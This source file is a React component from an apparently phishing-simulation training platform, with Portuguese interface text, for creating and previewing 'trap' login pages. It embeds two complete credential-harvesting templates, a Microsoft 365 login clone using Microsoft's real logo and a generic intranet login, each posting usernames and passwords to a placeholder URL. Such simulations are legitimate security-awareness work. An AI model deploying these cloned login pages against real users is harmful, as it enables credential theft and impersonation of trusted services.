import { useState, useEffect } from 'react';
import { 
  Box, Button, Typography, Paper, Table, TableBody, TableCell, 
  TableContainer, TableHead, TableRow, IconButton, Dialog, 
  DialogTitle, DialogContent, DialogActions, TextField, Stack,
  Snackbar, Alert, CircularProgress, InputAdornment, Grid, MenuItem
} from '@mui/material';
import { 
  Delete as DeleteIcon, 
  Edit as EditIcon, 
  Search as SearchIcon,
  AutoAwesome as AutoAwesomeIcon,
  Web as WebIcon
} from '@mui/icons-material';

interface PhishingPage {
  id: string; 
  nome: string;
  conteudoHtml: string;
}

const templatesPaginas = [
  { 
    id: 'microsoft', 
    nome: 'Login Microsoft 365', 
    html: `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Entrar em sua conta</title>
  <style>
    body { background-color: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { background: white; padding: 44px; width: 100%; max-width: 380px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
    .logo { height: 24px; margin-bottom: 24px; }
    h2 { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; margin-top: 0; }
    input { width: 100%; padding: 10px; margin-bottom: 16px; border: 1px solid #666; font-size: 15px; box-sizing: border-box; border-top-width: 1px; }
    input:focus { border-color: #0067b8; outline: none; }
    .btn { background-color: #0067b8; color: white; border: none; padding: 10px 32px; font-size: 15px; cursor: pointer; float: right; }
    .btn:hover { background-color: #005da6; }
    a { color: #0067b8; text-decoration: none; font-size: 13px; }
    .footer-links { margin-top: 16px; font-size: 13px; }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="logo">
    <h2>Entrar</h2>
    <form action="{{POST_URL}}" method="POST">
      <input type="email" name="email" placeholder="Email, telefone ou Skype" required>
      <input type="password" name="senha" placeholder="Senha" required>
      <div class="footer-links">
        <p>Nenhuma conta? <a href="#">Crie uma!</a></p>
        <p><a href="#">Não consegue acessar sua conta?</a></p>
      </div>
      <div style="margin-top: 24px; display: inline-block; width: 100%;">
        <button type="submit" class="btn">Avançar</button>
      </div>
    </form>
  </div>
</body>
</html>`
  },
  { 
    id: 'intranet', 
    nome: 'Portal Corporativo / Intranet Genérica', 
    html: `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Acesso Restrito - Intranet</title>
  <style>
    body { background-color: #eceff1; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { background: white; padding: 40px; width: 100%; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-top: 6px solid #2e7d32; text-align: center; }
    h2 { color: #333; margin-bottom: 10px; }
    p { color: #666; font-size: 14px; margin-bottom: 25px; }
    input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
    .btn { background-color: #2e7d32; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
    .btn:hover { background-color: #1b5e20; }
    .aviso { margin-top: 20px; font-size: 12px; color: #999; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Acesso Restrito</h2>
    <p>Autentique-se com suas credenciais de rede para visualizar este documento confidencial.</p>
    <form action="{{POST_URL}}" method="POST">
      <input type="text" name="matricula" placeholder="Matrícula ou Usuário" required>
      <input type="password" name="senha" placeholder="Senha da Rede" required>
      <button type="submit" class="btn">Acessar Sistema</button>
    </form>
    <div class="aviso">Acesso monitorado pelo Departamento de TI.</div>
  </div>
</body>
</html>`
  }
];

export default function PhishingPages() {
  const [pages, setPages] = useState<PhishingPage[]>([]);
  const [loading, setLoading] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [open, setOpen] = useState(false);
  const [editId, setEditId] = useState<string | null>(null); 
  
  const [novaPagina, setNovaPagina] = useState({ nome: '', conteudoHtml: '' });
  const [templateSelecionado, setTemplateSelecionado] = useState('');

  const [notify, setNotify] = useState({ open: false, message: '', type: 'success' as 'success' | 'error' | 'info' });

  const filteredPages = pages.filter((p) => 
    p.nome.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const fetchPages = async () => {
    setLoading(true);
    const token = localStorage.getItem('phishguard_token');
    try {
      const response = await fetch('http://localhost:5000/api/PhishingPages', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        setPages(data);
      }
    } catch (error) {
      showNotify("Erro ao conectar com o servidor", "error");
    } finally {
      setLoading(false);
    }
  };

  const showNotify = (message: string, type: 'success' | 'error' | 'info' = 'success') => {
    setNotify({ open: true, message, type });
  };

  const handleGerarTemplate = () => {
    if (!templateSelecionado) {
      showNotify("Selecione um molde primeiro!", "info");
      return;
    }
    
    const tpl = templatesPaginas.find(t => t.id === templateSelecionado);
    if (tpl) {
      setNovaPagina({
        nome: `[Gerador] ${tpl.nome}`,
        conteudoHtml: tpl.html
      });
      showNotify("Página carregada! Você pode ajustar o código HTML abaixo.", "success");
    }
  };

  const handleSave = async () => {
    const token = localStorage.getItem('phishguard_token');
    const url = editId ? `http://localhost:5000/api/PhishingPages/${editId}` : 'http://localhost:5000/api/PhishingPages';
    
    try {
      const response = await fetch(url, {
        method: editId ? 'PUT' : 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(editId ? { ...novaPagina, id: editId } : novaPagina)
      });

      if (response.ok) {
        showNotify(editId ? "Página atualizada!" : "Página salva com sucesso!");
        fetchPages();
        handleClose();
      } else {
        showNotify("Falha ao salvar. Verifique os dados.", "error");
      }
    } catch (error) {
      showNotify("Erro ao salvar página", "error");
    }
  };

  const handleDelete = async (id: string) => { 
    const token = localStorage.getItem('phishguard_token');
    if (window.confirm("Deseja realmente excluir esta página de captura?")) {
      try {
        const response = await fetch(`http://localhost:5000/api/PhishingPages/${id}`, {
          method: 'DELETE',
          headers: { 'Authorization': `Bearer ${token}` }
        });
        if (response.ok) {
          showNotify("Página removida com sucesso!");
          fetchPages();
        }
      } catch (error) {
        showNotify("Erro de rede ao remover página.", "error");
      }
    }
  };

  const handleEdit = (page: PhishingPage) => {
    setEditId(page.id);
    setNovaPagina({ nome: page.nome, conteudoHtml: page.conteudoHtml });
    setOpen(true);
  };

  const handleOpen = () => { 
    setEditId(null); 
    setNovaPagina({ nome: '', conteudoHtml: '' });
    setTemplateSelecionado('');
    setOpen(true); 
  };
  
  const handleClose = () => { setOpen(false); };

  useEffect(() => { fetchPages(); }, []);

  return (
    <Box>
      <Stack direction="row" justifyContent="space-between" alignItems="center" mb={3}>
        <Typography variant="h4" sx={{ fontWeight: 'bold' }}>Páginas Simuladas (Armadilhas)</Typography>
        
        <Box sx={{ display: 'flex', gap: 2, alignItems: 'center' }}>
          <TextField
            placeholder="Buscar página..."
            size="small"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            InputProps={{ startAdornment: (<InputAdornment position="start"><SearchIcon color="action" /></InputAdornment>) }}
            sx={{ backgroundColor: 'white', borderRadius: 1 }}
          />

          <Button variant="contained" startIcon={<WebIcon />} onClick={handleOpen}>
            Nova Página
          </Button>
        </Box>
      </Stack>

      <TableContainer component={Paper} elevation={2}>
        <Table>
          <TableHead sx={{ backgroundColor: '#f8f9fa' }}>
            <TableRow>
              <TableCell><strong>Identificação da Página</strong></TableCell>
              <TableCell align="right"><strong>Ações</strong></TableCell>
            </TableRow>
          </TableHead>
          <TableBody>
            {loading ? (
              <TableRow><TableCell colSpan={2} align="center"><CircularProgress sx={{ m: 2 }} /></TableCell></TableRow>
            ) : (
              filteredPages.map((page) => (
                <TableRow key={page.id} hover>
                  <TableCell>{page.nome}</TableCell>
                  <TableCell align="right">
                    <IconButton color="primary" onClick={() => handleEdit(page)}><EditIcon fontSize="small" /></IconButton>
                    <IconButton color="error" onClick={() => handleDelete(page.id)}><DeleteIcon fontSize="small" /></IconButton>
                  </TableCell>
                </TableRow>
              ))
            )}
            {!loading && filteredPages.length === 0 && (
              <TableRow>
                <TableCell colSpan={2} align="center" sx={{ py: 3 }}>
                  <Typography variant="body1" color="textSecondary">
                    Nenhuma página cadastrada. Crie sua primeira armadilha!
                  </Typography>
                </TableCell>
              </TableRow>
            )}
          </TableBody>
        </Table>
      </TableContainer>

      <Dialog open={open} onClose={handleClose} fullWidth maxWidth="lg">
        <DialogTitle>{editId ? "Editar Página Simulada" : "Construir Nova Página de Captura"}</DialogTitle>
        <DialogContent dividers>
          
          {!editId && (
            <Box sx={{ mb: 4, p: 3, backgroundColor: '#f0f4f8', borderRadius: 2, border: '1px dashed #b0bec5' }}>
              <Typography variant="subtitle1" color="primary" sx={{ fontWeight: 'bold', mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
                <AutoAwesomeIcon /> Carregar Molde Oficial
              </Typography>
              <Grid container spacing={2} alignItems="center">
                <Grid size={{ xs: 12, sm: 9 }}>
                  <TextField select fullWidth label="Escolha a Interface" value={templateSelecionado} onChange={(e) => setTemplateSelecionado(e.target.value)} size="small">
                    {templatesPaginas.map((t) => (<MenuItem key={t.id} value={t.id}>{t.nome}</MenuItem>))}
                  </TextField>
                </Grid>
                <Grid size={{ xs: 12, sm: 3 }}>
                  <Button variant="contained" color="secondary" fullWidth onClick={handleGerarTemplate}>
                    Carregar HTML
                  </Button>
                </Grid>
              </Grid>
            </Box>
          )}

          <Grid container spacing={3}>
            <Grid size={{ xs: 12, md: 6 }}>
              <TextField 
                fullWidth label="Nome de Identificação Interna" 
                value={novaPagina.nome} 
                onChange={(e) => setNovaPagina({...novaPagina, nome: e.target.value})} 
                sx={{ mb: 2 }}
              />
              <TextField 
                fullWidth label="Código Fonte (HTML + CSS)" multiline rows={20} 
                value={novaPagina.conteudoHtml} 
                onChange={(e) => setNovaPagina({...novaPagina, conteudoHtml: e.target.value})} 
                helperText="Mantenha o formulário apontando para {{POST_URL}} para a captura funcionar."
                sx={{ fontFamily: 'monospace' }}
              />
            </Grid>

            <Grid size={{ xs: 12, md: 6 }}>
              <Typography variant="subtitle2" gutterBottom sx={{ color: 'text.secondary' }}>
                Preview em Tempo Real (Visão da Vítima):
              </Typography>
              <Paper 
                variant="outlined" 
                sx={{ 
                  height: '560px', 
                  backgroundColor: '#fff', 
                  border: '2px solid #e0e0e0',
                  borderRadius: 2,
                  overflow: 'hidden'
                }}
              >
                <iframe 
                  title="Live Preview"
                  srcDoc={novaPagina.conteudoHtml || '<div style="padding: 20px; color: #999; font-family: sans-serif;">O preview aparecerá aqui...</div>'}
                  style={{ width: '100%', height: '100%', border: 'none' }}
                />
              </Paper>
            </Grid>
          </Grid>

        </DialogContent>
        <DialogActions sx={{ p: 2 }}>
          <Button onClick={handleClose} color="inherit">Cancelar</Button>
          <Button onClick={handleSave} variant="contained" size="large">Salvar Página</Button>
        </DialogActions>
      </Dialog>

      <Snackbar open={notify.open} autoHideDuration={4000} onClose={() => setNotify({ ...notify, open: false })} anchorOrigin={{ vertical: 'bottom', horizontal: 'right' }}>
        <Alert severity={notify.type} variant="filled" sx={{ width: '100%' }}>{notify.message}</Alert>
      </Snackbar>
    </Box>
  );
}